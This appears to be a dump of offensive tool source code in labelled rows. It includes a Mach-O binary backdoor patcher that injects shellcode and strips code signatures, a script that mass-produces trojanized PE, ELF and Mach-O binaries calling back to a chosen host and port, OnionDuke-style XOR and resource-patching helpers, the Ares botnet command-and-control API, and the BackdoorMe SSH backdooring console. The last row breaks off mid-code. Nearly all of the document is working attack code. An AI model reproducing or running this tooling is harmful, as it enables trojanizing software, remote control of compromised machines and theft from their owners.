                     'LC_DYLIB_CODE_SIGN_DRS': LC_DYLIB_CODE_SIGN_DRS,
                     'last_cmd': last_cmd
                     }

        return _tempDict

    def patch_macho(self):

        if self.supported is False:
            print self.FILE, ""is not supported.""
            return False

        self.output_options()

        if self.PREPROCESS is True:
            self.preprocess()

        if not os.path.exists(""backdoored""):
            os.makedirs(""backdoored"")

        os_name = os.name

        if os_name == 'nt':
            self.backdoorfile = ""backdoored\\"" + self.OUTPUT
        else:
            self.backdoorfile = ""backdoored/"" + self.OUTPUT

        shutil.copy2(self.FILE, self.backdoorfile)

        for key, value in self.mach_hdrs.iteritems():
            MagicNumber = value['MagicNumber']
            text_section = self.ImpValues[key]['text_section']
            last_cmd = self.ImpValues[key]['last_cmd']
            LC_MAIN = self.ImpValues[key]['LC_MAIN']
            LC_UNIXTREAD = self.ImpValues[key]['LC_UNIXTREAD']

            if self.binary_header == ""\xca\xfe\xba\xbe"":
                offset = int(self.fat_hdrs[key]['Offset'], 16)
            else:
                offset = 0x0
            LC_CODE_SIGNATURE = self.ImpValues[key]['LC_CODE_SIGNATURE']
            LC_DYLIB_CODE_SIGN_DRS = self.ImpValues[key]['LC_DYLIB_CODE_SIGN_DRS']

            patchx64 = True
            patchx86 = True

            if self.FAT_FILE is True and self.FAT_PRIORITY != 'ALL':
                if self.FAT_PRIORITY.lower() == 'x64':
                    patchx86 = False
                if self.FAT_PRIORITY.lower() == 'x86':
                    patchx64 = False

            with open(self.backdoorfile, 'r+b') as bin:
                if MagicNumber == '0xfeedfacf' and patchx64 is True:
                    print ""[*] Patching x86_64 Mach-O Binary""
                    cave_size = struct.unpack(""<I"", text_section['Offset'])[0] + offset - last_cmd
                    print ""[*] Pre-text section 'code cave' size:"", hex(cave_size)

                    resultShell = self.set_shells(MagicNumber)
                    if not resultShell:
                        print ""[!] Could not set shell""
                        return False

                    if len(self.shellcode) > cave_size:
                        print ""[!] Shellcode is larger than available space""
                        return False

                    startingLocation = struct.unpack(""<I"", text_section['Offset'])[0] + offset - len(self.shellcode)

                    if LC_UNIXTREAD != {}:
                        print ""[*] ...with LC_UNIXTREAD format""
                        #print 'LC_UNIXTREAD', struct.unpack(""<Q"", LC_UNIXTREAD['rip'])[0], struct.unpack(""<Q"", text_section['Address'])[0]
                        if struct.unpack(""<Q"", LC_UNIXTREAD['rip'])[0] - struct.unpack(""<Q"", text_section['Address'])[0] != 0x0:
                            self.jumpLocation = struct.unpack(""<Q"", LC_UNIXTREAD['rip'])[0] - struct.unpack(""<Q"", text_section['Address'])[0]
                    else:
                        print ""[*] ...with LC_MAIN format""
                        #print struct.unpack(""<Q"", LC_MAIN['EntryOffset'])[0], struct.unpack(""<I"", text_section['Offset'])[0]
                        if struct.unpack(""<Q"", LC_MAIN['EntryOffset'])[0] - struct.unpack(""<I"", text_section['Offset'])[0] != 0x0:
                            self.jumpLocation = struct.unpack(""<Q"", LC_MAIN['EntryOffset'])[0] - struct.unpack(""<I"", text_section['Offset'])[0]

                    resultShell = self.set_shells(MagicNumber)
                    if not resultShell:
                        print ""[!] Could not set shell""
                        return False
                    #print 'shellcode:', self.shellcode.encode('hex')

                    bin.seek(startingLocation, 0)
                    bin.write(self.shellcode)
                    bin.seek(text_section['LOCAddress'], 0)
                    newAddress = struct.unpack(""<Q"", text_section['Address'])[0] - len(self.shellcode)
                    bin.write(struct.pack(""<Q"", newAddress))
                    newSize = struct.unpack(""<Q"", text_section['Size'])[0] + len(self.shellcode)
                    bin.write(struct.pack(""<Q"", newSize))
                    newOffset = struct.unpack(""<I"", text_section['Offset'])[0] - len(self.shellcode)
                    bin.write(struct.pack(""<I"", newOffset))
                    if LC_UNIXTREAD != {}:
                        bin.seek(LC_UNIXTREAD['LOCrip'], 0)
                        bin.write(struct.pack(""<Q"", newAddress))
                    elif LC_MAIN != {}:
                        bin.seek(LC_MAIN[""LOCEntryOffset""], 0)
                        bin.write(struct.pack(""<Q"", newOffset))

                elif MagicNumber == '0xfeedface' and patchx86 is True:
                    print ""[*] Patching x86 (i386) Mach-O Binary""
                    cave_size = struct.unpack(""<I"", text_section['Offset'])[0] + offset - last_cmd
                    print ""[*] Pre-text section 'code cave' size:"", hex(cave_size)

                    resultShell = self.set_shells(MagicNumber)
                    if not resultShell:
                        print ""[!] Could not set shell""
                        return False

                    if len(self.shellcode) > cave_size:
                        print ""[!] Shellcode is larger than available space""
                        return False

                    #FIND Current Location
                    startingLocation = struct.unpack(""<I"", text_section['Offset'])[0] + offset - len(self.shellcode)

                    if LC_UNIXTREAD != {}:
                        print ""[*] ...with LC_UNIXTREAD format""
                        if struct.unpack(""<I"", LC_UNIXTREAD['eip'])[0] - struct.unpack(""<I"", text_section['Address'])[0] != 0x0:
                            self.jumpLocation = struct.unpack(""<I"", LC_UNIXTREAD['eip'])[0] - struct.unpack(""<I"", text_section['Address'])[0]
                    else:
                        print ""[*] ...with LC_Main format""
                        if struct.unpack(""<Q"", LC_MAIN['EntryOffset'])[0] - struct.unpack(""<I"", text_section['Offset'])[0] != 0x0:
                            self.jumpLocation = struct.unpack(""<Q"", LC_MAIN['EntryOffset'])[0] - struct.unpack(""<I"", text_section['Offset'])[0]

                    resultShell = self.set_shells(MagicNumber)
                    if not resultShell:
                        print ""[!] Could not set shell""
                        return False

                    bin.seek(startingLocation, 0)
                    bin.write(self.shellcode)
                    bin.seek(text_section['LOCAddress'], 0)
                    newAddress = struct.unpack(""<I"", text_section['Address'])[0] - len(self.shellcode)
                    bin.write(struct.pack(""<I"", newAddress))
                    newSize = struct.unpack(""<I"", text_section['Size'])[0] + len(self.shellcode)
                    bin.write(struct.pack(""<I"", newSize))
                    newOffset = struct.unpack(""<I"", text_section['Offset'])[0] - len(self.shellcode)
                    bin.write(struct.pack(""<I"", newOffset))
                    if LC_UNIXTREAD != {}:
                        bin.seek(LC_UNIXTREAD['LOCeip'], 0)
                        bin.write(struct.pack(""<I"", newAddress))
                    else:
                        bin.seek(LC_MAIN[""LOCEntryOffset""], 0)
                        bin.write(struct.pack(""<I"", newOffset))

                else:
                    print ""[!] Not patching this arch:"", MagicNumber
                    continue

                if LC_CODE_SIGNATURE != {}:
                    print ""[*] Removing LC_CODE_SIGNATURE command""
                    bin.seek(self.mach_hdrs[key]['LOCLoadCmds'], 0)
                    oldNumber = struct.unpack(""<I"", bin.read(4))[0]
                    bin.seek(self.mach_hdrs[key]['LOCLoadCmds'], 0)
                    bin.write(struct.pack(""<I"", oldNumber - 1))
                    oldsize = struct.unpack(""<I"", bin.read(4))[0]
                    bin.seek(self.mach_hdrs[key]['LOCLoadCmds'] + 4, 0)
                    bin.write(struct.pack(""<I"", oldsize - 0x10))

                if LC_DYLIB_CODE_SIGN_DRS != {}:
                    print ""[*] Removing LC_DYLIB_CODE_SIGN_DRS command""
                    bin.seek(self.mach_hdrs[key]['LOCLoadCmds'], 0)
                    oldNumber = struct.unpack(""<I"", bin.read(4))[0]
                    bin.seek(self.mach_hdrs[key]['LOCLoadCmds'], 0)
                    bin.write(struct.pack(""<I"", oldNumber - 1))
                    oldsize = struct.unpack(""<I"", bin.read(4))[0]
                    bin.seek(self.mach_hdrs[key]['LOCLoadCmds'] + 4, 0)
                    bin.write(struct.pack(""<I"", oldsize - 0x10))

        print ""[!] Patching Complete""

        # CHECK AND DELETE TMP FILE HERE
        
        if self.tmp_file != None:
            if self.keep_temp is True:
                # tmpfilename_orginalname.exe
                print ""[*] Saving TempFile to:"", os.path.basename(self.FILE) + '_' + self.ORIGINAL_FILE 
                shutil.copy2(self.FILE, os.path.basename(self.FILE) + '_' + self.ORIGINAL_FILE )
            try:
                shutil.rmtree(self.tmp_file.name)
            except: # OSError:
                pass
                #print ""[*] TempFile already removed.""

        return True"
payload,"import pebin
import machobin
import elfbin
import sys
import os


def basicDiscovery(FILE):
        macho_supported = ['\xcf\xfa\xed\xfe', '\xca\xfe\xba\xbe',
                           '\xce\xfa\xed\xfe',
                           ]

        testBinary = open(FILE, 'rb')
        header = testBinary.read(4)
        testBinary.close()
        if 'MZ' in header:
            return 'PE'
        elif 'ELF' in header:
            return 'ELF'
        elif header in macho_supported:
            return ""MACHO""
        else:
            'Only support ELF, PE, and MACH-O file formats'
            return None

if __name__ == ""__main__"":
    '''
    Will create patched binaries for each payload for the type of binary provided.
    Each payload has it's own port number.
    Usage: ./payloadtests.py file 127.0.0.1 8080
    '''
    if len(sys.argv) != 4:
        print ""Will create patched binaries for each stock shellcode/payload for the ""
        print ""type of binary provided. Each payload type has it's own port number.""
        print ""Usage:"" + str(sys.argv[0]) + "" binary HOST PORT""
        sys.exit()

    file = sys.argv[1]
    host = sys.argv[2]
    port = int(sys.argv[3])
    outputfiles = {}

    is_supported = basicDiscovery(file)

    if is_supported is ""PE"":
        patchtypes = ['APPEND', 'JUMP', 'SINGLE']
        supported_file = pebin.pebin(FILE=file, OUTPUT=None, SHELL='none')
        supported_file.run_this()
        #print supported_file.flItms['avail_shells']
        for aShell in supported_file.flItms['avail_shells']:
            for patchtype in patchtypes:
                if 'cave_miner' in aShell or 'user_supplied' in aShell:
                    continue
                aName = aShell + ""."" + patchtype + ""."" + str(host) + ""."" + str(port) + ""."" + file
                print ""Creating File:"", aName
                if patchtype == 'APPEND':
                    supported_file = pebin.pebin(FILE=file, OUTPUT=aName,
                                                 SHELL=aShell, HOST=host,
                                                 PORT=port, ADD_SECTION=True)

                elif patchtype == 'JUMP':
                    supported_file = pebin.pebin(FILE=file, OUTPUT=aName,
                                                 SHELL=aShell, HOST=host,
                                                 PORT=port, CAVE_JUMPING=True)
                elif patchtype == 'SINGLE':
                    supported_file = pebin.pebin(FILE=file, OUTPUT=aName,
                                                 SHELL=aShell, HOST=host,
                                                 PORT=port, CAVE_JUMPING=False)
                result = supported_file.run_this()
                outputfiles[aName] = result

            port += 1

    elif is_supported is ""ELF"":
        supported_file = elfbin.elfbin(FILE=file, OUTPUT=None, SHELL='none')
        supported_file.run_this()

        for aShell in supported_file.avail_shells:
            if 'cave_miner' in aShell or 'user_supplied' in aShell:
                continue
            aName = aShell + ""."" + str(host) + ""."" + str(port) + ""."" + file
            print ""Creating File:"", aName
            supported_file = elfbin.elfbin(FILE=file, OUTPUT=aName,
                                           SHELL=aShell, HOST=host,
                                           PORT=port)
            result = supported_file.run_this()
            outputfiles[aName] = result

            port += 1

    elif is_supported is ""MACHO"":
        supported_file = machobin.machobin(FILE=file, OUTPUT=None, SHELL='none')
        supported_file.run_this()

        for aShell in supported_file.avail_shells:
            if 'cave_miner' in aShell or 'user_supplied' in aShell:
                continue
            aName = aShell + ""."" + str(host) + ""."" + str(port) + ""."" + file
            print ""Creating File:"", aName
            supported_file = machobin.machobin(FILE=file, OUTPUT=aName,
                                               SHELL=aShell, HOST=host,
                                               PORT=port, FAT_PRIORITY='ALL')
            result = supported_file.run_this()
            outputfiles[aName] = result

            port += 1

    print ""Successful files are in backdoored:""
    for afile, aresult in outputfiles.iteritems():
        if aresult is True:
            print afile, 'Success'
        else:
            print afile, 'Fail'
            os.remove('backdoored/' + afile)"
onionduke,"import struct
import os


def xor_file(input_file, output_file, xorkey):
    number_added = 0
    while True:

        some_bytes = input_file.read(4)
        if len(some_bytes) == 0:
            break
        if len(some_bytes) % 4 != 0:
            number_added = 4 - len(some_bytes)
            some_bytes = some_bytes + ""\x00"" * (number_added)

        writable_bytes = struct.pack(""<I"", (struct.unpack(""<I"", some_bytes)[0]) ^ xorkey)
        output_file.write(writable_bytes)

    if number_added != 0:
        number_added = 0 - number_added
        output_file.seek(number_added, os.SEEK_END)
        output_file.truncate()


def write_rsrc(f, oldrva, newRva):
    '''
    This parses a .rsrc section and will adjust the RVA attributes
    for patching on to the OnionDuke Stub
    '''
    rsrc_structure = {}

    def parse_header(f):
        return {""Characteristics"": struct.unpack(""<I"", f.read(4))[0],
                ""TimeDataStamp"": struct.unpack(""<I"", f.read(4))[0],
                ""MajorVersion"": struct.unpack(""<H"", f.read(2))[0],
                ""MinorVersion"": struct.unpack(""<H"", f.read(2))[0],
                ""NumberOfNamedEntries"": struct.unpack(""<H"", f.read(2))[0],
                ""NumberofIDEntries"": struct.unpack(""<H"", f.read(2))[0],
                }

    def merge_two_dicts(x, y):
        '''Given two dicts, merge them into a new dict as a shallow copy.'''
        z = x.copy()
        z.update(y)
        return z

    def parse_data_entry(f):
        return {""WriteME"": f.tell(),
                ""RVA of Data"": struct.unpack(""<I"", f.read(4))[0],
                ""Size"": struct.unpack(""<I"", f.read(4))[0],
                ""CodePage"": struct.unpack(""<I"", f.read(4))[0],
                ""Reserved"": struct.unpack(""<I"", f.read(4))[0]
                }

    def parse_ID(f, number):
        temp = {}
        for i in range(0, number):
            _tempid = struct.unpack(""<I"", f.read(4))[0]
            temp[_tempid] = struct.unpack(""<I"", f.read(4))[0]
        return temp

    #parse initial header
    rsrc_structure['Typeheader'] = parse_header(f)
    rsrc_structure['Typeheader']['NameEntries'] = {}
    rsrc_structure['Typeheader'][""IDentries""] = {}

    if rsrc_structure['Typeheader'][""NumberofIDEntries""]:
        rsrc_structure['Typeheader'][""IDentries""] = parse_ID(f, rsrc_structure['Typeheader'][""NumberofIDEntries""])
    if rsrc_structure['Typeheader'][""NumberOfNamedEntries""]:
        rsrc_structure['Typeheader']['NameEntries'] = parse_ID(f, rsrc_structure['Typeheader']['NumberOfNamedEntries'])

    #merge, flatten
    rsrc_structure['Typeheader']['Entries'] = merge_two_dicts(rsrc_structure['Typeheader'][""IDentries""],
                                                              rsrc_structure['Typeheader']['NameEntries'])
    for entry, value in rsrc_structure['Typeheader'][""Entries""].iteritems():

        #jump to location in PE adjusted for RVA
        f.seek((value & 0xffffff), 0)

        rsrc_structure[entry] = parse_header(f)
        rsrc_structure[entry][""IDs""] = {}
        rsrc_structure[entry][""Names""] = {}

        if rsrc_structure[entry][""NumberofIDEntries""]:
            rsrc_structure[entry][""IDs""] = parse_ID(f, rsrc_structure[entry][""NumberofIDEntries""])

        if rsrc_structure[entry][""NumberOfNamedEntries""]:
            rsrc_structure[entry][""Names""] = parse_ID(f, rsrc_structure[entry][""NumberOfNamedEntries""])

        rsrc_structure[entry][""NameIDs""] = merge_two_dicts(rsrc_structure[entry][""IDs""],
                                                           rsrc_structure[entry][""Names""])

        #Now get language
        for name_id, offset in rsrc_structure[entry][""NameIDs""].iteritems():
            f.seek((offset & 0xffffff), 0)
            rsrc_structure[name_id] = parse_header(f)
            rsrc_structure[name_id][""IDs""] = {}
            rsrc_structure[name_id][""Names""] = {}

            if rsrc_structure[name_id][""NumberofIDEntries""]:
                rsrc_structure[name_id][""IDs""] = parse_ID(f, rsrc_structure[name_id][""NumberofIDEntries""])

            if rsrc_structure[name_id][""NumberOfNamedEntries""]:
                rsrc_structure[name_id][""Names""] = parse_ID(f, rsrc_structure[name_id][""NumberOfNamedEntries""])

            rsrc_structure[name_id][""language""] = merge_two_dicts(rsrc_structure[name_id][""IDs""],
                                                                  rsrc_structure[name_id][""Names""])

            #now get Data Entry Details and write
            for lanID, offsetDataEntry in rsrc_structure[name_id][""language""].iteritems():
                f.seek((offsetDataEntry & 0xffffff), 0)
                rsrc_structure[lanID] = parse_data_entry(f)
                #write to location
                f.seek(rsrc_structure[lanID][""WriteME""], 0)
                f.write(struct.pack(""<I"", rsrc_structure[lanID][""RVA of Data""] - oldrva + newRva))"
Ares Init,"import json
import base64
import os
from datetime import datetime
import tempfile
import shutil

from flask import Blueprint
from flask import request
from flask import abort
from flask import current_app
from flask import url_for
from flask import send_file
from flask import render_template
from werkzeug.utils import secure_filename
import pygeoip
from flask import flash
from flask import redirect
from flask import escape
import cgi

from webui import require_admin
from models import db
from models import Agent
from models import Command


api = Blueprint('api', __name__)
GEOIP = pygeoip.GeoIP('api/GeoIP.dat', pygeoip.MEMORY_CACHE)


def geolocation(ip):
    geoloc_str = 'Local'
    info = GEOIP.record_by_addr(ip)
    if info:
        geoloc_str = info['city'] + ' [' + info['country_code'] + ']'
    return geoloc_str


@api.route('/massexec', methods=['POST'])
@require_admin
def mass_execute():
    selection = request.form.getlist('selection')
    if 'execute' in request.form:
        for agent_id in selection:
            Agent.query.get(agent_id).push_command(request.form['cmd'])
        flash('Executed ""%s"" on %s agents' % (request.form['cmd'], len(selection)))
    elif 'delete' in request.form:
        for agent_id in selection:
            db.session.delete(Agent.query.get(agent_id))
        db.session.commit()
        flash('Deleted %s agents' % len(selection))
    return redirect(url_for('webui.agent_list'))


@api.route('/<agent_id>/push', methods=['POST'])
@require_admin
def push_command(agent_id):
    agent = Agent.query.get(agent_id)
    if not agent:
        abort(404)
    agent.push_command(request.form['cmdline'])
    return ''


@api.route('/<agent_id>/stdout')
@require_admin
def agent_console(agent_id):
    agent = Agent.query.get(agent_id)
    return render_template('agent_console.html', agent=agent)


@api.route('/<agent_id>/hello', methods=['POST'])
def get_command(agent_id):
    agent = Agent.query.get(agent_id)
    if not agent:
        agent = Agent(agent_id)
        db.session.add(agent)
        db.session.commit()
    # Report basic info about the agent
    info = request.json
    if info:
        if 'platform' in info:
            agent.operating_system = info['platform']
        if 'hostname' in info:
            agent.hostname = info['hostname']
        if 'username' in info:
            agent.username = info['username']
    agent.last_online = datetime.now()
    agent.remote_ip = request.remote_addr
    agent.geolocation = geolocation(agent.remote_ip)
    db.session.commit()
    # Return pending commands for the agent
    cmd_to_run = ''
    cmd = agent.commands.order_by(Command.timestamp.desc()).first()
    if cmd:
        cmd_to_run = cmd.cmdline
        db.session.delete(cmd)
        db.session.commit()
    return cmd_to_run


@api.route('/<agent_id>/report', methods=['POST'])
def report_command(agent_id):
    agent = Agent.query.get(agent_id)
    if not agent:
        abort(404)
    out = request.form['output']
    agent.output += cgi.escape(out)
    db.session.add(agent)
    db.session.commit()
    return ''


@api.route('/<agent_id>/upload', methods=['POST'])
def upload(agent_id):
    agent = Agent.query.get(agent_id)
    if not agent:
        abort(404)
    for file in request.files.values():
        upload_dir = os.path.join(current_app.config['UPLOAD_FOLDER'])
        agent_dir = agent_id
        store_dir = os.path.join(upload_dir, agent_dir)
        filename = secure_filename(file.filename)
        if not os.path.exists(store_dir):
            os.makedirs(store_dir)
        file_path = os.path.join(store_dir, filename)
        while os.path.exists(file_path):
            filename = ""_"" + filename
            file_path = os.path.join(store_dir, filename)
        file.save(file_path)
        download_link = url_for('webui.uploads', path=agent_dir + '/' + filename)
        agent.output += '[*] File uploaded: <a target=""_blank"" href=""' + download_link + '"">' + download_link + '</a>\n'
        db.session.add(agent)
        db.session.commit()
    return ''"
Ares ,"#!/usr/bin/env python2

import random
import string
import hashlib
from functools import wraps
import datetime
import os
import shutil
import tempfile

from flask import Flask
from flask_script import Manager

from models import db
from models import Agent
from models import Command
from webui import webui
from api import api
from config import config


app = Flask(__name__)
app.config.from_object(config['dev'])
app.register_blueprint(webui)
app.register_blueprint(api, url_prefix=""/api"")
db.init_app(app)
manager = Manager(app)


@app.after_request
def headers(response):
    response.headers[""Server""] = ""Ares""
    return response


@manager.command
def initdb():
    db.drop_all()
    db.create_all()
    db.session.commit()

    
if __name__ == '__main__':
    manager.run()"
backdoorme,"import os
import socket
import subprocess
import target
import getpass
import rlcompleter
from colorama import *
from tkinter import *
import cmd
from backdoors import *
from modules import *
import importlib
import inspect
import sys
import traceback
import netifaces as ni
from six.moves import input
import six

GOOD = Fore.GREEN + "" + "" + Fore.RESET
BAD = Fore.RED + "" - "" + Fore.RESET
WARN = Fore.YELLOW + "" * "" + Fore.RESET
INFO = Fore.BLUE + "" + "" + Fore.RESET
OPEN = Fore.GREEN + ""open"" + Fore.RESET
CLOSED = Fore.RED + ""closed"" + Fore.RESET

sys.path.append(""backdoors"")
sys.path.append(""modules"")


def ascii_art():
    print(""   ___           __      __              __  ___""   )
    print(""  / _ )___ _____/ /_____/ /__  ___  ____/  |/  /__ "")
    print("" / _  / _ `/ __/  '_/ _  / _ \/ _ \/ __/ /|_/ / -_)"")
    print(""/____/\_,_/\__/_/\_\\\\_,_/\___/\___/_/ /_/  /_/\__/ "")


class BackdoorMe(cmd.Cmd):
    prompt = Fore.BLUE + "">> "" + Fore.RESET

    def __init__(self):
        cmd.Cmd.__init__(self)
        self.enabled_modules = enabled_modules 
        self.target_num = 1
        self.port = 22 
        self.targets = {}
        self.curtarget = None
        self.get_local_ip()
        
        if six.PY3:
            self.localIP = str(self.localIP)
        else:
            self.localIP = self.localIP.encode('ascii', 'ignore').decode('ascii')

        self.ctrlc = False
        ascii_art()
        print(""Welcome to BackdoorMe, a powerful backdooring utility. Type \""help\"" to see the list of available commands."")
        print(""Type \""addtarget\"" to set a target, and \""open\"" to open an SSH connection to that target."")
        print(""Using local IP of %s."" % self.localIP)
        self.addtarget(""127.0.0.1"", ""george"", ""password"")
    
    def get_local_ip(self):
        interfaces = ni.interfaces()
        interface = """"
        for iface in interfaces:
            if ni.AF_INET in ni.ifaddresses(iface) and ""lo"" not in iface:
                interface = iface

        if interface != """":
            addrs = ni.ifaddresses(interface)
            ipinfo = addrs[socket.AF_INET][0]
            self.localIP = ipinfo['addr']


    def print_help(self, lst):
        it = iter(lst)
        for x in it:
            print(""{0:<20} {1:<25}"".format(x, next(it)))

    def do_help(self, args):
        print(""Type \""addtarget\"" to set a target, and \""open\"" to open an SSH connection to that target."")
        print(""Using local IP of %s."" % self.localIP)
        print(""\nAvailable commands are: "")
        print(""======================="")
        self.print_help([""addtarget"", ""adds a target"", ""change_ip <IP>"", ""changes local IP used by backdoors"", ""change_port <PORT>"", ""changes SSH port of current target"", ""close"", ""closes an existing SSH connection to target"", ""edittarget"", ""edit existing target"", ""history"", ""displays command history"", ""list"", ""lists currently loaded targets, available backdoors, and enabled modules."", ""open"", ""opens an SSH connection to the target"", ""quit"", ""exits backdoorme"", ""set target <#>"", ""set the current target to given number"", ""use <BACKDOOR>"", ""loads given backdoor for exploit. Run \""list\"" or \""list backdoors\"" for a full list of available backdoors.""])
        #cmd.Cmd.do_help(self, args)
    
    def addtarget(self, hostname, uname, pword):
        t = target.Target(hostname, uname, pword, self.target_num)
        self.targets[self.target_num] = t
        self.target_num += 1
        self.curtarget = t

    def get_target_info(self):
        hostname = input('Target Hostname: ') #victim host
        try:
            socket.inet_aton(hostname)
        except socket.error:
            print(BAD + ""Invalid IP Address."")
            return None, None, None
        uname = input('Username: ')  # username for the box to be attacked
        pword = getpass.getpass()  # password for the box to be attacked
        return hostname, uname, pword
    
    def do_addtarget(self, args):
        hostname, uname, pword = self.get_target_info()
        if hostname is None:
            return
        print(GOOD + ""Target %d Set!"" % self.target_num)
        self.addtarget(hostname, uname, pword)
    
    def do_edittarget(self, args):
        t = self.get_target(args, connect=False)
        if t is None:
            return
        hostname, uname, pword = self.get_target_info() 
        t.hostname = hostname
        t.uname = uname
        t.pword = pword
        print(GOOD + ""Target edited"")

    def do_set(self, args):
        if len(args.split()) == 0 or args.split()[0] != ""target"":
            print(BAD + ""Usage is \""set target <target-num>\"""")
            return
        t = self.get_target(args, connect=False)
        if t is None:
            return
        self.curtarget = t
        print(GOOD + ""Current target set to %s"" % args.split()[-1])
    
    def open_conn(self,t):
        try: 
            t.conn()
        except:
            print(BAD + ""Connection failed."")
            return
        print(GOOD + ""Connection established."")

    def do_open(self, args):
        t = self.get_target(args)
        if t is None:
            return

    def do_close(self, args):
        t = self.get_target(args)
        if t is None:
            return
        try: 
            t.close()
        except:
            print(BAD + ""Connection could not be closed."")
            return
        print(GOOD + ""Connection closed."")

    def get_target(self, args, connect=True):
        t = self.curtarget
        if (len(args.split()) == 1 and not args.split()[-1].isdigit()) or len(args.split()) == 0:
            if self.curtarget is None:
                print(BAD + ""No currently set target. Add a target with 'addtarget'."")
                return None
            else:
                print(GOOD + ""Using current target %d."" % t.target_num)
        elif not self.target_exists(int(args.split()[-1])):
            print(BAD + ""No target with that target ID found."" )
            return None
        else:
            print(GOOD + ""Using target %s"" % args.split()[-1])
            t = self.targets[int(args.split()[-1])]
        if not t.is_open and connect:
            print(BAD + ""No SSH connection to target. Attempting to open a connection..."")
            self.open_conn(t)
  
        return t

    def target_exists(self, num):
        return (num in self.targets)  
 
    def do_use(self, args):
        try:
            bd = args.split()[0]
            loc, bd =  bd.rsplit(""/"", 1)
            if ""backdoors/"" + loc not in sys.path: 
                sys.path.insert(0, ""backdoors/"" + loc)
            mod = importlib.import_module(bd)
            t = self.get_target(args)
            if t is None:
                return

            clsmembers = inspect.getmembers(sys.modules[bd], inspect.isclass)
            try:
                [m for m in clsmembers if m[1].__module__ == bd][0][1](self).cmdloop() 
            except Exception as e:
                print(BAD + ""An unexpected error occured."")
                print(e)
                traceback.print_exc()
        except Exception as e:
            print(BAD + args + "" backdoor cannot be found."")
            print(e)
            traceback.print_exc()

    def do_passwd(self, args):
        t = self.get_target(args)
        if t is None:
            return
        if not t.is_open:
            print(BAD + ""No SSH connection to target. Run \""open\"" to start a connection."")
            return
        username = input("" + Enter the username: "")
        password = input("" + Enter the new password: "")
        self.curtarget.ssh.exec_command(""echo '%s:%s | sudo chpasswd"" %(username, password))
        print(""Changing %s to %s..."" % (username, password)) 

    def do_change_ip(self, args):
        newIP = input(""Please input the ip you want to use: "")
        try:
            socket.inet_aton(newIP)
            self.localIP = newIP
        except socket.error:
            print(BAD + ""Invalid IP Address."")
            return 
        print(GOOD + ""Local IP is now: "" + newIP)

    def do_change_port(self, args):
        t = self.get_target(args)
        if t is None:
            return

        newPort = input(""Please enter the port you want to use for future connections: "")
        t.port = newPort
        print(GOOD + ""SSH Port for target is now: "" + t.port)
        if input(""Enter y if you'd like to restart the SSH connection with the new port now: "") == 'y':
            self.do_close(args)
            self.do_open(args)

    def do_quit(self, args):
        self.quit()

    def do_clear(self, args):
        os.system(""clear"")

    def walk(self, folder, echo=True, recursive=False):
        bds = []
        for root, dirs, files in os.walk(folder):
            bds += [d + ""/"" for d in dirs if ""__"" not in d]

            if ""__"" in root:  # ignore folders that start with __
                continue
            path = root.split('/')
            if echo and len([f for f in files if f[-3:] == "".py""]) > 0:  # Only show a folder if it has a python file in it
                print((((len(path) - 1) * 2 - 1)*' ') + INFO + path[-1]+""/"")
            for f in files:
                if f[-3:] == "".py"" and ""util_"" not in f:
                    name = str(f).replace("".py"", """")
                    bds.append(root.replace(""backdoors/"", """") + ""/"" + name if recursive else name)
                    if echo:
                        print((len(path)*'  ') + ""- "" + str(f).replace("".py"", """"))
            if not recursive:
                break

        return bds
    
    def do_sessions(self, args):
        if args == """" or args == ""--help"" or args == ""-h"":
            print(""Use sessions -l to list and sessions -i <num> to interact with a shell"")
        if args == """" or args == ""--list"" or args == ""-l"":
            i = 1
            for session in self.curtarget.sessions:
                print(str(i))
                print(session)
                i += 1
        if ""-i"" in args or ""--interact"" in args:
            self.curtarget.sessions[int(args.split("" "")[1]) - 1].interact()

        print(args)

    def get_categories(self):
        for root, dirs, files in os.walk(""backdoors""):
            return [f for f in dirs if ""__"" not in f]

    def get_capabilities(self, category=None, recursive=False):
        caps = []
        if category is None:
            for cat in self.get_categories():
                caps += self.walk(""backdoors/""+cat, echo=False, recursive=recursive)
            return caps
        else:
            return self.walk(""backdoors/""+category, echo=False, recursive=recursive)

    def complete_use(self, text, line, begin_index, end_index):
        line = line.rsplit("" "")[1]
        segment = line.split(""/"")
        if len(segment) == 1:
            opts = self.walk(""backdoors/"", echo=False)
        else:
            opts = self.walk(""backdoors/"" + ""/"".join(segment[:-1]), echo=False)  
        opts = [o for o in opts if o.startswith(text)]
        if not opts:
            opts = self.walk(""backdoors/"" + ""/"".join(segment[:-1]), echo=False, recursive=True)
            return [o for o in opts if text in o]
        #print text
        #print [o for o in opts if o.startswith(text)]
        return opts 

    def do_list(self, args):
        if args == ""targets"" or len(args) == 0:
            print(GOOD + ""Targets: "")
            for num, t in self.targets.items():
                print("" "" + (WARN if (num == list(self.targets.values()).index(self.curtarget) + 1) else "" * "") + ""%s - %s %s:%s - %s"" % (num, t.hostname, t.uname, t.pword, (OPEN if (t.is_open) else CLOSED)))
        if args == ""modules"" or len(args) == 0:
            print(GOOD + ""Available modules: "")
            for num, mod in enumerate(sorted(self.enabled_modules.keys())):
                print(""  * "" + ""%s"" % (mod))
        if args == ""backdoors"" or len(args) == 0:
            print(GOOD+ ""Available backdoors: "")
            for cat in self.get_categories():
                self.walk(""backdoors/"" + cat)
        if len(args) != 0 and args != ""targets"" and args != ""backdoors"" and args != ""modules"":
            print(BAD + ""Unknown option "" + args)

    def preloop(self):
        cmd.Cmd.preloop(self)   ## sets up command completion
        self._hist    = []      ## No history yet
        self._locals  = {}      ## Initialize execution namespace for user
        self._globals = {}

    def do_history(self, args):
        print(self._hist)

    def do_exit(self, args):
        self.quit()

    def precmd(self, line):
        self._hist += [ line.strip() ]
        self.ctrlc = False
        return line
        
    def default(self, line):       
        try:
            print(GOOD + ""Executing \"""" + line + ""\"""")
            os.system(line)
        except Exception as e:
            print(e.__class__, "":"", e)

    def cmdloop(self, intro=None):
        try:
            cmd.Cmd.cmdloop(self)
        except KeyboardInterrupt:
            if not self.ctrlc: 
                self.ctrlc = True
                print(""\n"" + BAD + ""Please run \""quit\"" or \""exit\"" to exit, or press Ctrl-C again."")
                self.cmdloop()
            else:
                print("""")
                self.quit()

    def do_EOF(self, line):
        print("""")
        return True

    def emptyline(self):
        return

    def quit(self):
        print(BAD + ""Exiting..."")
        exit()
        return


def main():
    BackdoorMe().cmdloop()


if __name__ == ""__main__"":
    main()"
backdoorme_listen,"import socket
import time
import sys
import os
import cmd
import pexpect

#First argument - port 
#Second argument - password
#third - if it has a prompt or not, defaults to some (meaning it has a prompt)

class Interpreter(cmd.Cmd):
	def __init__(self):
		cmd.Cmd.__init__(self)
		self.prompt = "" ### ""
		self.bind()
		self.initLines = """"
		if sys.argv[2] == ""none"":
